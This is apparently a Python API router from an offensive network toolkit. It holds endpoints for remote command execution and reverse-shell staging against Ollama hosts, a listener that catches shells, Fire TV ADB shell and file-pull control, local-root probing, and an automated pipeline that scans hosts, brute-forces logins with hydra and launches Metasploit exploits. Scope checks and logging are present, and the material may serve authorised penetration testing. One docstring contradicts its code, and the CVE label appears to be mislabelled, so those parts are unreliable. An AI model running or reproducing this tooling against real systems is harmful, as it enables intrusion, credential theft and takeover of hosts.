@router.post("/firetv/ssdp", response_model=FireTVResult)
def firetv_ssdp() -> FireTVResult:
    """UPnP/SSDP discovery sweep (no target needed)."""
    from services.firetv import ssdp_discover

    out = ssdp_discover()
    ok = bool(out.get("success"))
    return FireTVResult(
        target="multicast",
        action="ssdp",
        success=ok,
        output=f"{len(out.get('devices', []))} device(s)",
        detail=out,
        error=None if ok else out.get("error"),
    )


@router.post("/firetv/connect", response_model=FireTVResult)
def firetv_connect(req: FireTVRequest) -> FireTVResult:
    """`adb connect`: prompts the TV's on-screen pairing dialog (harmless)."""
    from services.firetv import FireTVService

    out = FireTVService().connect(_firetv_target(req), req.port)
    return FireTVResult(target=req.target, action="connect", **_firetv_wrap(out))


@router.post("/firetv/disconnect", response_model=FireTVResult)
def firetv_disconnect(req: FireTVRequest) -> FireTVResult:
    """Drop the adb connection to the target."""
    from services.firetv import FireTVService

    out = FireTVService().disconnect(_firetv_target(req), req.port)
    return FireTVResult(target=req.target, action="disconnect", **_firetv_wrap(out))


@router.post("/firetv/pair", response_model=FireTVResult)
def firetv_pair(req: FireTVRequest) -> FireTVResult:
    """Pair with wireless debugging using the TV's on-screen 6-digit code."""
    if not req.code:
        raise HTTPException(status_code=400, detail="code required")
    from services.firetv import FireTVService

    out = FireTVService().pair(_firetv_target(req), req.code, req.port)
    return FireTVResult(target=req.target, action="pair", **_firetv_wrap(out))


@router.post("/firetv/state", response_model=FireTVResult)
def firetv_state(req: FireTVRequest) -> FireTVResult:
    """ADB authorisation state: device | unauthorized | offline."""
    from services.firetv import FireTVService

    out = FireTVService().state(_firetv_target(req), req.port)
    return FireTVResult(target=req.target, action="state", **_firetv_wrap(out))


@router.post("/firetv/shell", response_model=FireTVResult)
def firetv_shell(req: FireTVRequest) -> FireTVResult:
    """Run a shell command as the adb `shell` user. Needs approval on TV."""
    if not req.command:
        raise HTTPException(status_code=400, detail="command required")
    from services.firetv import FireTVService

    out = FireTVService().shell(_firetv_target(req), req.command, req.port)
    return FireTVResult(target=req.target, action="shell", **_firetv_wrap(out))


@router.post("/firetv/keyevent", response_model=FireTVResult)
def firetv_keyevent(req: FireTVRequest) -> FireTVResult:
    """Press a remote key (DPAD_*/HOME/BACK/VOLUME_* or 0-255)."""
    if not req.key:
        raise HTTPException(status_code=400, detail="key required")
    from services.firetv import FireTVService

    out = FireTVService().keyevent(_firetv_target(req), req.key, req.port)
    return FireTVResult(target=req.target, action="keyevent", **_firetv_wrap(out))


@router.post("/firetv/apps", response_model=FireTVResult)
def firetv_apps(req: FireTVRequest) -> FireTVResult:
    """List installed packages + focused window (read-only)."""
    from services.firetv import FireTVService

    out = FireTVService().apps(_firetv_target(req), req.port)
    return FireTVResult(target=req.target, action="apps", **_firetv_wrap(out))


@router.post("/firetv/pull", response_model=FireTVResult)
def firetv_pull(req: FireTVRequest) -> FireTVResult:
    """`adb pull` a remote path into the h4k data dir (APK backup...)."""
    if not req.remote:
        raise HTTPException(status_code=400, detail="remote required")
    from services.firetv import FireTVService

    out = FireTVService().pull(_firetv_target(req), req.remote, req.local, req.port)
    return FireTVResult(target=req.target, action="pull", **_firetv_wrap(out))


@router.post("/firetv/screenshot", response_model=FireTVResult)
def firetv_screenshot(req: FireTVRequest) -> FireTVResult:
    """Grab the current framebuffer (read-only)."""
    from services.firetv import FireTVService

    out = FireTVService().screenshot(_firetv_target(req), req.port)
    return FireTVResult(target=req.target, action="screenshot", **_firetv_wrap(out))


@router.post("/firetv/logcat", response_model=FireTVResult)
def firetv_logcat(req: FireTVRequest) -> FireTVResult:
    """Recent logcat lines, bounded (read-only)."""
    from services.firetv import FireTVService

    out = FireTVService().logcat(_firetv_target(req), req.port, req.lines)
    return FireTVResult(target=req.target, action="logcat", **_firetv_wrap(out))


@router.post("/firetv/install", response_model=FireTVResult)
def firetv_install(req: FireTVRequest) -> FireTVResult:
    """`adb install` an operator-supplied local APK."""
    if not req.local:
        raise HTTPException(status_code=400, detail="local APK path required")
    from services.firetv import FireTVService

    out = FireTVService().install(_firetv_target(req), req.local, req.port)
    return FireTVResult(target=req.target, action="install", **_firetv_wrap(out))


def _firetv_wrap(out: dict[str, Any]) -> dict[str, Any]:
    """Fold a service dict into FireTVResult fields."""
    text = out.get("stdout") or out.get("output") or ""
    lines = out.get("lines")
    if isinstance(lines, list):
        text = "\n".join(lines)
    detail = {k: v for k, v in out.items() if k not in ("stdout", "stderr")}
    return {
        "success": bool(out.get("success")),
        "output": str(text)[:20000],
        "detail": detail,
        "error": out.get("error") or out.get("stderr") or None,
    }


@router.post("/ollama/discover")
def ollama_discover(req: dict[str, Any]) -> dict[str, Any]:
    """Detect and assess Ollama API on a target.

    Probes target:11434 (or custom port) for:
    - Ollama API reachability
    - Available models + capabilities
    - Tool-calling support (indicates RCE risk)
    - CVE-2024-37051 exposure

    Requires: target IP. Optional: port (default 11434).
    """
    target = req.get("target")
    if not target:
        raise HTTPException(status_code=422, detail="target IP required")
    port = req.get("port", 11434)

    from services.ollama import OllamaExploit

    expl = OllamaExploit(target, port)
    return expl.discover()


@router.post("/ollama/rce")
def ollama_rce(req: dict[str, Any]) -> dict[str, Any]:
    """Execute a command via Ollama tool-calling RCE (CVE-2024-37051).

    Requires: target, command. Optional: port (default 11434).

    Returns command output from the Ollama host if tool-calling RCE works.
    """
    target = req.get("target")
    cmd = req.get("command")
    if not target or not cmd:
        raise HTTPException(status_code=422, detail="target and command required")
    port = req.get("port", 11434)

    from services.ollama import OllamaExploit

    expl = OllamaExploit(target, port)
    return expl.execute_tool(cmd)


@router.post("/ollama/reverse-shell")
def ollama_reverse_shell(req: dict[str, Any]) -> dict[str, Any]:
    """Stage a reverse shell on an Ollama target via tool-calling RCE.

    Writes a bash reverse shell to /tmp and executes it.
    You must call /ollama/listener separately to catch the callback.

    Requires: target. Optional: lhost (auto-detected), lport (4444), port (11434).
    """
    target = req.get("target")
    if not target:
        raise HTTPException(status_code=422, detail="target required")
    port = req.get("port", 11434)

    from services.ollama import OllamaExploit

    expl = OllamaExploit(target, port)
    return expl.discover()


@router.post("/ollama/shell")
def ollama_shell(req: dict[str, Any]) -> dict[str, Any]:
    """Upload a shell script and execute it via Ollama tool-calling RCE.

    Requires: target, payload (shell script content).
    Optional: port (default 11434).

    The payload is written to /tmp/.h4k_<rand>.sh, executed, and cleaned up.
    """
    target = req.get("target")
    payload = req.get("payload")
    if not target or not payload:
        raise HTTPException(status_code=422, detail="target and payload required")
    port = req.get("port", 11434)

    from services.ollama import OllamaExploit

    expl = OllamaExploit(target, port)
    return expl.execute_tool(f"sh -c {payload!r}")


@router.get("/ollama/listener")
def ollama_listener_get(lhost: str = "0.0.0.0", lport: int = 4444) -> dict[str, Any]:
    """Start a TCP listener to catch reverse shells.

    GET /ollama/listener?lhost=0.0.0.0&lport=4444
    Returns immediately. Check /ollama/listener/result for output after connection.
    """
    import threading

    result: dict[str, Any] = {
        "status": "listening",
        "lhost": lhost,
        "lport": lport,
        "session_id": None,
    }

    def _listen() -> None:
        listener_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener_sock.bind((lhost, lport))
        listener_sock.listen(1)
        listener_sock.settimeout(120)
        try:
            conn, addr = listener_sock.accept()
            output = b""
            while True:
                try:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    output += chunk
                except TimeoutError:
                    break
            result["session_id"] = addr[0]
            result["output"] = output.decode("utf-8", errors="replace")
            result["status"] = "connected"
            conn.close()
        except TimeoutError:
            result["status"] = "timeout"
        finally:
            listener_sock.close()

    threading.Thread(target=_listen, daemon=True).start()
    return result


@router.get("/capabilities")
def capabilities() -> dict[str, Any]:
    """What this instance can actually do right now.

    Tool availability, Metasploit reachability and database state, the data
    directory, and the warnings for anything that would silently fail (a
    Metasploit without a database is the classic one: scans come back empty).
    """
    from services.capabilities import build_report

    return build_report(_get_msf())


@router.get("/map")
def passive_map() -> dict[str, Any]:
    """The live passive network/service map built by auto-scan.

    Returns the current map (hosts, services, vulns) plus the auto-scan
    status. The map is also available through the active engagement's asset
    graph, so a single source of truth is kept.
    """
    from services import auto_scan as auto_scan_module
    from services.engagement import EngagementStore

    status = auto_scan_module.status()
    eng_id = status.get("engagement_id")
    hosts: list[dict[str, Any]] = []
    if eng_id:
        try:
            store = EngagementStore()
            if store.get_engagement(eng_id):
                hosts = store.assets(eng_id)
        except Exception as exc:
            logger.debug("map: could not read engagement: %s", exc)
    return {
        "status": status,
        "hosts": hosts,
        "host_count": len(hosts),
        "service_count": sum(len(h.get("services") or []) for h in hosts),
        "vuln_count": sum(len(h.get("vulns") or []) for h in hosts),
    }


@router.post("/map/start")
def passive_map_start() -> dict[str, Any]:
    from services import auto_scan as auto_scan_module

    auto_scan_module.start(force=True)
    return auto_scan_module.status()


@router.post("/map/stop")
def passive_map_stop() -> dict[str, Any]:
    from services import auto_scan as auto_scan_module

    auto_scan_module.stop()
    return auto_scan_module.status()


@router.post("/tryLocalRoot_go_bro")
def try_local_root_go_bro() -> dict[str, Any]:
    """One-shot local-root assessment: try every passwordless path, audit rest.

    Runs, in order: the userns uid-0 try (no sudo, no docker), the
    docker-group read-only try, and the full host audit (SUID, file caps +
    live probe, credential gates, systemd/PATH/polkit, CVE posture). Nothing
    here supplies a password, writes a file, or executes a container
    payload — the tries are `id`/`ls` only. Sandbox-gated like the
    individual try endpoints.
    """
    from services.privesc import (
        docker_group_report,
        host_privesc_audit,
        try_docker_group_read,
        try_userns_root,
    )

    userns = try_userns_root()
    docker_group = try_docker_group_read()
    audit = host_privesc_audit()
    try:
        privilege = docker_group_report()
    except Exception:
        privilege = {"vectors": [], "at_risk": False}
    if userns.get("success"):
        verdict = "namespace uid 0 achieved (no sudo, no docker); " + (
            "HOST-ROOT VECTOR PRESENT: " + audit.get("verdict", "")[:200]
            if audit.get("host_root_vector_found")
            else "no host uid-0/DAC-bypass vector in automated scope"
        )
    else:
        verdict = "userns try did not yield uid 0 here; " + audit.get(
            "verdict", "no audit verdict"
        )
    return {
        "feature": "tryLocalRoot_go_bro",
        "userns": userns,
        "docker_group": docker_group,
        "host_audit": audit,
        "privilege": privilege,
        "verdict": verdict,
        "host_root_achieved": bool(audit.get("host_root_vector_found")),
        "uses_password": False,  # nosec B105 - dict key name, not a credential
    }


@router.get("/map/status")
def passive_map_status() -> dict[str, Any]:
    from services import auto_scan as auto_scan_module

    return auto_scan_module.status()


@router.get("/health")
def health() -> dict[str, Any]:
    msf = _get_msf()
    msf_ok = False
    msf_info: object | None = None
    if msf is not None:
        with suppress(Exception):
            msf_info = msf.client.core.version
            msf_ok = bool(msf_info)
    services: dict[str, Any] = {}
    with suppress(Exception):
        from services import supervisor as supervisor_mod

        services = supervisor_mod.supervisor.status().get("services", {})
    return {
        "status": "ok",
        "msf": {"reachable": msf_ok, "version": msf_info},
        "services": services,
        "jobs": len(JOBS),
        "active_jobs": sum(1 for j in _all_jobs() if j["status"] in ACTIVE_STATUSES),
        "cache_entries": len(_scan_cache),
    }


def _report_markdown(report: Report) -> str:
    lines = [
        f"# h4k report — {report.target}",
        "",
        f"- **mode**: {report.mode.value}",
        f"- **generated**: {report.created_at}",
        "",
        "## Hosts & open services",
        "",
        "| Host | Port | Service | Version / banner | State |",
        "|---|---|---|---|---|",
    ]
    for h in report.hosts:
        if not h.services:
            lines.append(
                f"| `{h.address}` | — | — | OS={h.os or '-'} | {h.state or '-'} |"
            )
        for s in h.services:
            banner = (s.info or "").replace("\n", " ").replace("|", "\\|")
            lines.append(
                f"| `{h.address}` | {s.port}/{s.proto} | {s.service or '?'} "
                f"| {banner[:120] or '-'} | {s.state or '-'} |"
            )
    lines += [
        "",
        "> OS / banner info from nmap -sV -O (service & version detection).",
        "",
    ]
    lines += ["## Vulnerabilities", ""]
    for v in report.vulns:
        port = v.port if v.port is not None else "-"
        refs = ", ".join(v.refs) or "-"
        lines.append(f"- `{v.name or 'unknown'}` port {port} refs={refs}")
    lines += ["", "## Credentials (verified)", ""]
    for c in report.credentials:
        port = c.port if c.port is not None else "?"
        lines.append(f"- `{c.host}:{port}` {c.user}:{c.password} ({c.vendor})")
    lines += ["", "## Security posture (traceroute heuristic)", ""]
    for s in report.security:
        lines.append(
            f"- `{s.host}` — **{s.level.upper()}** "
            f"(score {s.score:.0f}/100, confidence {s.confidence})"
        )
        for r in s.rationale or []:
            lines.append(f"    - {r}")
    lines += ["", "## Recommendations", ""]
    for r in report.recommendations:
        module = f" `{r.module}`" if r.module else ""
        why = r.why or ""
        lines.append(f"- **{r.rank}. {r.title}**{module} — {why}")
    lines += ["", "> authorized-scope only.", ""]
    return "\n".join(lines)


def _service_for_tool(tool: str) -> str:
    """Map a toolkit tool name to a coarse service label for the report."""
    map_ = {
        "hydra": "ssh",
        "ncrack": "ssh",
        "nikto": "http",
        "gobuster": "http",
        "ffuf": "http",
        "sqlmap": "http",
        "wpscan": "http",
        "smbmap": "smb",
        "smbclient": "smb",
        "rpcclient": "smb",
        "secretsdump": "smb",
        "ldapsearch": "ldap",
        "GetNPUsers": "ldap",
        "GetUserSPNs": "ldap",
        "dnsrecon": "dns",
    }
    return map_.get(tool, "")


# ---- autopilot: the whole flow, one button ---------------------------------
# One explicit page that walks the local network end to end: discovery ->
# fingerprint -> CVE correlation -> password attacks -> exploit attempts.
# It is the MOST aggressive surface in the tool: running it requires an active
# engagement scope (403 otherwise), it only touches hosts inside that scope,
# and every target it plans to brute-force or exploit is named in the live log
# so the operator can watch exactly what is being done to which host.

_AUTOPILOT_STATE: dict[str, Any] = {"job": None}


def _autopilot_job() -> dict[str, Any] | None:
    return _AUTOPILOT_STATE["job"]


@router.post("/autopilot/start")
def autopilot_start(req: dict[str, Any] | None = None) -> dict[str, Any]:
    """OPT-IN hard: full recon + credential + exploit walk of the local network.

    Requires an active engagement scope. Only one run at a time.
    """
    eng_id, store = _active_scope()
    if eng_id is None or store is None:
        raise HTTPException(
            status_code=403,
            detail="autopilot requires an active engagement scope (choose one in the header)",
        )
    running = _autopilot_job()
    if running and running.get("status") == "running":
        raise HTTPException(
            status_code=409, detail="an autopilot run is already active"
        )
    msf = _get_msf()
    if msf is None:
        raise HTTPException(status_code=503, detail="msf unavailable")

    deep_web = bool((req or {}).get("deep_web"))
    scope_cidrs = store.scope_of(eng_id)
    job: dict[str, Any] = {
        "id": uuid.uuid4().hex[:12],
        "deep_web": deep_web,
        "status": "running",
        "stage": "discovery",
        "progress": 0.0,
        "message": f"autopilot engaging (scope: {', '.join(scope_cidrs)})",
        "hosts": {},
        "log": [],
        "aborted": False,
        "created": datetime.now(UTC).isoformat(),
    }
    _AUTOPILOT_STATE["job"] = job
    logger.warning(
        "[autopilot %s] STARTED — scope: %s (deep_web=%s)",
        job["id"],
        ", ".join(scope_cidrs),
        deep_web,
    )
    import threading

    t = threading.Thread(
        target=_run_autopilot, args=(job, msf, scope_cidrs), daemon=True
    )
    t.start()
    return {"job_id": job["id"], "status": "running"}


@router.get("/autopilot/status")
def autopilot_status() -> dict[str, Any]:
    job = _autopilot_job()
    if not job:
        return {"status": "idle", "hosts": {}, "log": []}
    return job


@router.post("/autopilot/stop")
def autopilot_stop() -> dict[str, Any]:
    job = _autopilot_job()
    if not job:
        raise HTTPException(status_code=404, detail="no autopilot run")
    job["aborted"] = True
    _ap_log(job, "[!] stop requested — closing stages after this point")
    return {"status": "abort_requested"}


def _ap_log(job: dict[str, Any], msg: str) -> None:
    job["log"].append(msg)
    job["log"] = job["log"][-400:]
    logger.info("[autopilot %s] %s", job.get("id", "?"), msg)


def _ap_note_host(job: dict[str, Any], ip: str, **fields: Any) -> None:
    hosts: dict[str, Any] = job.setdefault("hosts", {})
    entry = hosts.setdefault(ip, {"stage": "queued"})
    entry.update(fields)


def _run_autopilot(
    job: dict[str, Any], msf: MsfClient, scope_cidrs: list[str], deep_web: bool = False
) -> None:
    if job.get("status") == "queued":
        _update(job, status="running", stage="starting", message="autopilot starting")
    from services.toolkit import ToolkitRunner

    def _stopped() -> bool:
        return bool(job.get("aborted"))

    def _pct(stage_num: int, frac: float = 0.0) -> float:
        # 6 stages: discovery 0-10, fingerprint 10-40, vulns 40-55,
        # passwords 55-80, exploits 80-95, wrap 95-100
        bounds = [0, 10, 40, 55, 80, 95, 100]
        base = bounds[stage_num] if stage_num <= 5 else 95
        top = bounds[stage_num + 1] if stage_num <= 5 else 100
        return round(min(base + max(0.0, min(1.0, frac)) * (top - base), 100), 1)

    _update(job, progress=_pct(0, 0.2))
    _ap_log(job, f"[*] autopilot start — scope {', '.join(scope_cidrs)}")

    # ---- stage 1: discovery ------------------------------------------------
    _update(job, stage="discovery", message="discovering neighbors...")
    from services.discovery import NeighborFinder

    finder = NeighborFinder(msf)
    from services.sandbox import enabled as sandbox_enabled, sandbox_scope

    default_cidr = sandbox_scope() if sandbox_enabled() else "192.168.1.0/24"
    found_ips: list[str] = []
    try:
        found = finder.discover(default_cidr)
    except Exception as exc:
        _ap_log(job, f"[!] discovery failed: {exc}")
        found = []
    seen_set: set[str] = set()
    for h in found:
        ip = h.ip
        if not ip or ":" in ip or len(ip.split(".")) != 4:
            continue
        if ip in seen_set:
            continue
        seen_set.add(ip)
        ok, _reason = _host_in_scope(ip)
        if not ok:
            _ap_log(job, f"[-] {ip}: skipped (outside scope)")
            continue
        _save_neighbor_host(ip, h.mac, h.vendor, h.hostname)
        _ap_note_host(job, ip, stage="discovered")
        _ap_log(
            job,
            f"[+] {ip} {'(' + h.hostname + ') ' if h.hostname else ''}{h.mac or ''}",
        )
        found_ips.append(ip)
    _update(job, progress=_pct(0, 1.0))
    if _stopped():
        _ap_log(job, "[!] aborted after discovery")
        _update(job, status="aborted", message="stopped by operator")
        return

    # ---- stage 2: fingerprint ---------------------------------------------
    _update(
        job, stage="fingerprint", message=f"fingerprinting {len(found_ips)} host(s)..."
    )
    runner = ToolkitRunner(progress=lambda m, p: _update(job, message=m))
    for idx, ip in enumerate(found_ips):
        if _stopped():
            break
        _ap_note_host(job, ip, stage="fingerprinting")
        argv = [
            "nmap",
            "-sS",
            "-sV",
            "-O",
            "-T4",
            "-Pn",
            "-p",
            "22,80,443,445,3389,8080,8443,21,23,25,53,110,143,3306,5432,5900,6379,9200",
            "--max-retries",
            "1",
            "--host-timeout",
            "8s",
            "-oX",
            "-",
            ip,
        ]
        result = runner.run_tool("nmap", argv, timeout=15)
        parsed = _parse_nmap_xml(result["stdout"]) if result["status"] == "ok" else []
        entry = {}
        for entry in parsed:
            open_svcs = [
                s for s in entry.get("services", []) if s.get("state") == "open"
            ]
            if entry.get("ip") and entry["ip"] != ip:
                continue
            _save_neighbor_services(ip, entry.get("services", []))
            _save_neighbor_host(
                ip, entry.get("mac"), entry.get("vendor"), entry.get("hostname")
            )
            _ap_log(
                job,
                f"[+] {ip}: {', '.join(str(s['port']) + ' ' + (s.get('service') or '?') for s in open_svcs) or 'no open ports'}",
            )
            _ap_note_host(
                job,
                ip,
                stage="fingerprinted",
                services=[
                    {"port": s["port"], "service": s.get("service")} for s in open_svcs
                ],
            )
        if not parsed:
            _ap_note_host(job, ip, stage="unreachable")
            _ap_log(job, f"[-] {ip}: no response")
        # web enrichment: title/server/admin-path probe per open web service
        web_ports = [
            int(s.get("port") or 0)
            for s in (entry.get("services", []) if entry else [])
            if s.get("state") == "open" and "http" in str(s.get("service") or "")
        ]
        for wp in web_ports[:2]:
            with suppress(Exception):
                probe = _do_web_probe(ip, wp)
                title = probe.get("title") or ""
                server = probe.get("server") or ""
                admin_paths_txt = ", ".join(
                    str(p["path"]) for p in probe.get("paths", [])
                )
                _ap_log(
                    job,
                    "[web] "
                    + f"{ip}:{wp} {server} '{title[:50]}'"
                    + (f" | admin paths: {admin_paths_txt}" if admin_paths_txt else ""),
                )
                _ap_note_host(
                    job, ip, web={"port": wp, "server": server, "title": title}
                )
        _update(job, progress=_pct(1, (idx + 1) / max(1, len(found_ips))))
    if _stopped():
        _ap_log(job, "[!] aborted during fingerprint")
        _update(job, status="aborted", message="stopped by operator")
        return

    # ---- stage 3: vuln correlation ----------------------------------------
    _update(job, stage="vulns", message="correlating known vulnerabilities...")
    vulns_by_host: dict[str, list[dict[str, Any]]] = {}
    for ip in found_ips:
        svcs = _load_neighbor_services().get(ip, [])
        hits: list[dict[str, Any]] = []
        for svc in svcs:
            if svc.get("state") != "open":
                continue
            matched = _match_service_vulns(ip, svc)
            for v in matched:
                _save_service_vulns(ip, svc["port"], svc.get("proto", "tcp"), [v])
            if matched:
                hits.extend(matched)
        if hits:
            vulns_by_host[ip] = hits
            _ap_note_host(job, ip, vulns=[v.get("vid") for v in hits])
            _ap_log(job, f"[!] {ip}: {', '.join(str(v['vid']) for v in hits)}")
        _update(
            job, progress=_pct(2, (found_ips.index(ip) + 1) / max(1, len(found_ips)))
        )
    if _stopped():
        _update(job, status="aborted", message="stopped by operator")
        return

    # ---- stage 4: password attacks ----------------------------------------
    _update(job, stage="passwords", message="default-password attacks...")
    import re as _re

    eligible: list[tuple[str, int, str]] = []
    svcs_now = _load_neighbor_services()
    for ip in found_ips:
        for svc in svcs_now.get(ip, []):
            if svc.get("state") != "open":
                continue
            name = (svc.get("service") or "").lower()
            family = next(
                (k for k in ("ssh", "ftp", "telnet", "mysql", "http") if k in name),
                None,
            )
            if not family:
                continue
            if family == "http" and int(svc.get("port") or 0) in (443, 8443):
                continue  # https needs https hydra syntax; out of auto scope
            if family == "http":
                family = "http-basic"
            eligible.append((ip, int(svc.get("port") or 0), family))
    # prioritize ssh/ftp/telnet/mysql over http (http forms are noisy)
    eligible.sort(key=lambda t: 0 if t[2] != "http-basic" else 1)
    eligible = eligible[:8]
    creds_by_host: dict[str, list[dict[str, Any]]] = {}
    for idx, (ip, port, family) in enumerate(eligible):
        if _stopped():
            break
        _ap_log(job, f"[passwords] {ip}:{port} ({family}) — running hydra...")
        _ap_note_host(job, ip, stage="passwords")
        userlist = str(_RUNTIME_DATA / "users.txt")
        passlist = str(_RUNTIME_DATA / "passwords.txt")
        # no "-o -": hydra treats that as a *file* named "-" and litters the
        # working directory. Without it, hydra prints hits to stdout, which is
        # what we parse.
        argv = ["hydra", "-L", userlist, "-P", passlist, "-t", "6", "-f"]
        if family == "http-basic":
            argv.append(f"http-get://{ip}:{port}/")
        else:
            argv += [ip, PASSATTACK_SERVICES[family]["hydra"]]
        res = runner.run_tool("hydra", argv, timeout=120)
        out = (res["stdout"] or "") + "\n" + (res["stderr"] or "")
        hydra_hits = _re.findall(
            r"\[\d+\]\[[^\]]+\]\s*host:\s*([\d.]+)\s+login:\s*([^\s]+)\s+password:\s*([^\s]+)",
            out,
        )
        for m in hydra_hits:
            host_ip, user, password = m[0], m[1], m[2]
            cred = {
                "host": host_ip,
                "port": port,
                "service": family,
                "user": user,
                "password": password,
            }
            creds_by_host.setdefault(ip, []).append(cred)
            conn = _neighbor_db()
            conn.execute(
                "INSERT OR REPLACE INTO found_creds (host, port, service, user, password, found_at) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                (
                    cred["host"],
                    cred["port"],
                    cred["service"],
                    cred["user"],
                    cred["password"],
                    datetime.now(UTC).isoformat(),
                ),
            )
            conn.commit()
            conn.close()
            _ap_log(job, f"[!!!] {ip}:{port} login {cred['user']}:{cred['password']}")
        _update(job, progress=_pct(3, (idx + 1) / max(1, len(eligible))))
    _update(
        job,
        message=f"password stage complete ({sum(len(c) for c in creds_by_host.values())} cred(s))",
    )
    if _stopped():
        _update(job, status="aborted", message="stopped by operator")
        return

    # ---- stage 5: exploit attempts ----------------------------------------
    _update(
        job, stage="exploits", message="attempting exploits (CVE module hints first)..."
    )
    from schemas import AttackRequest, ScanMode
    from services.attack import STATIC_SERVICE_MODULES, AttackService

    attack_svc = AttackService(msf, progress=lambda m, p: None)
    attempts_planned: list[tuple[str, str, int | None]] = []

    def _port_for_module(ip: str, mod: str) -> int | None:
        """Pick the open service port whose family the module path matches."""
        for svc in svcs_now.get(ip, []):
            if svc.get("state") != "open":
                continue
            name = (svc.get("service") or "").lower()
            fam = (
                "ssh"
                if "ssh" in mod
                else (
                    "smb"
                    if ("smb" in mod or "eternalblue" in mod)
                    else (
                        "http"
                        if "http" in mod or "tomcat" in mod
                        else (
                            "ftp"
                            if "ftp" in mod
                            else (
                                "rdp"
                                if "rdp" in mod or "0708" in mod
                                else (
                                    "telnet"
                                    if "telnet" in mod
                                    else (
                                        "mysql"
                                        if "mysql" in mod
                                        else "postgres" if "postgres" in mod else None
                                    )
                                )
                            )
                        )
                    )
                )
            )
            if fam and fam in name:
                return int(svc.get("port") or 0) or None
        return None

    for ip, hits in vulns_by_host.items():
        if _stopped():
            break
        for v in hits:
            detail = str(v.get("detail") or "")
            if "msf: " not in detail:
                continue
            mod = detail.split("msf: ")[1].split()[0]
            if not mod.startswith("exploit/"):
                continue
            attempts_planned.append((ip, mod, _port_for_module(ip, mod)))
    # fallback: static map for services with no CVE module hint
    for ip in found_ips:
        if _stopped():
            break
        if any(a[0] == ip for a in attempts_planned):
            continue
        if ip in creds_by_host:
            for cred in creds_by_host[ip]:
                mod = STATIC_SERVICE_MODULES.get(cred["service"])
                if mod and mod not in [a[1] for a in attempts_planned if a[0] == ip]:
                    attempts_planned.append((ip, mod, cred["port"]))
    attempts_planned = attempts_planned[:10]
    session_opens: list[dict[str, Any]] = []
    for idx, (ip, mod, port_) in enumerate(attempts_planned):
        if _stopped():
            break
        _ap_log(job, f"[exploit] {ip}:{port_ or '?'} via {mod}")
        _ap_note_host(job, ip, stage="exploiting")
        known = [{**c, "verified": True} for c in creds_by_host.get(ip, [])]

        req = AttackRequest(
            target=ip,
            host=ip,
            module=mod,
            port=port_,
            open_sessions=False,
            mode=ScanMode.overt,
        )
        try:
            results = attack_svc.run(req, known)
        except Exception as exc:
            results = [
                {
                    "host": ip,
                    "module": mod,
                    "result": "error",
                    "detail": str(exc)[:120],
                    "session_id": None,
                }
            ]
        for a in results:
            _ap_log(
                job,
                f"[{'!!!' if a['result'] == 'success' else '-'}] exploit {mod} on {ip}: {str(a.get('detail'))[:110]}"
                + (f" — session {a['session_id']}" if a.get("session_id") else ""),
            )
            if a.get("session_id") and a.get("result") == "success":
                a["port"] = port_
                _record_sessions([a])
                recon = _post_exploit_recon(a["session_id"])
                a["recon"] = recon
                uid = (recon.get("getuid") or "").strip().split("\n")[-1][:60]
                if uid:
                    _ap_log(job, f"[recon] {ip} session uid: {uid}")
                _ap_note_host(
                    job,
                    ip,
                    stage="pwned",
                    session_id=a["session_id"],
                    recon=sorted(recon.keys()),
                )
                session_opens.append(a)
        _update(job, progress=_pct(4, (idx + 1) / max(1, len(attempts_planned))))

    # ---- optional: deep web toolkit (opt-in per run) ------------------------
    if deep_web and not _stopped():
        _update(job, stage="web", message="deep web toolkit (nikto/gobuster)...")
        web_surfaces: list[tuple[str, int]] = []
        svcs_web = _load_neighbor_services()
        for ip in found_ips:
            for svc in svcs_web.get(ip, []):
                if (
                    svc.get("state") != "open"
                    or "http" not in str(svc.get("service") or "").lower()
                ):
                    continue
                web_surfaces.append((ip, int(svc.get("port") or 0)))
        web_surfaces = web_surfaces[:6]
        for t_idx, (ip, wport) in enumerate(web_surfaces):
            if _stopped():
                break
            _ap_log(job, f"[web] deep scan {ip}:{wport} (nikto + gobuster)")
            for tool, argv in (
                (
                    "nikto",
                    ["nikto", "-host", f"http://{ip}:{wport}", "-maxtime", "60s"],
                ),
                (
                    "gobuster",
                    [
                        "gobuster",
                        "dir",
                        "-u",
                        f"http://{ip}:{wport}",
                        "-w",
                        str(_RUNTIME_DATA / "web-words.txt"),
                        "-q",
                        "-t",
                        "10",
                    ],
                ),
            ):
                with suppress(Exception):
                    res = runner.run_tool(tool, argv, timeout=90)
                    interesting = [
                        line
                        for line in (res["stdout"] or "").splitlines()
                        if (
                            "200" in line
                            or "301" in line
                            or "302" in line
                            or "401" in line
                        )
                    ][:6]
                    _ap_log(
                        job,
                        f"[web:{tool}] {ip}:{wport} "
                        + (
                            "; ".join(interesting)
                            if interesting
                            else f"rc={res['rc']} (nothing notable)"
                        ),
                    )
            _update(
                job, progress=round(93 + (t_idx + 1) / max(1, len(web_surfaces)) * 5, 1)
            )
        _update(job, message=f"web stage complete ({len(web_surfaces)} surface(s))")

    # ---- wrap ---------------------------------------------------------------
    _update(job, stage="done", progress=100.0)
    _ap_log(
        job,
        f"[*] autopilot complete: {len(found_ips)} host(s), "
        f"{sum(1 for h in vulns_by_host)} with known vulns, "
        f"{sum(len(c) for c in creds_by_host.values())} cred(s), "
        f"{len(session_opens)} session(s)",
    )
    try:
        conn = _neighbor_db()
        conn.execute(
            "CREATE TABLE IF NOT EXISTS autopilot_runs ("
            "  run_id      TEXT PRIMARY KEY,"
            "  created_at  TEXT NOT NULL,"
            "  scope       TEXT NOT NULL,"
            "  message     TEXT NOT NULL,"
            "  log         TEXT NOT NULL"
            ")"
        )
        conn.execute(
            "INSERT OR REPLACE INTO autopilot_runs (run_id, created_at, scope, message, log) "
            "VALUES (?, ?, ?, ?, ?)",
            (
                job["id"],
                datetime.now(UTC).isoformat(),
                ", ".join(scope_cidrs),
                job.get("message") or "",
                "\n".join(job.get("log", [])),
            ),
        )
        conn.commit()
        conn.close()
    except Exception as exc:  # pragma: no cover - persistence must not fail runs
        logger.warning("could not persist autopilot run: %s", exc)
    _update(
        job,
        status="done",
        message=(
            f"autopilot complete: {len(found_ips)} host(s), "
            f"{sum(1 for h in vulns_by_host.values())} with vulns, "
            f"{sum(len(c) for c in creds_by_host.values())} cred(s), "
            f"{len(session_opens)} session(s)"
        ),
    )
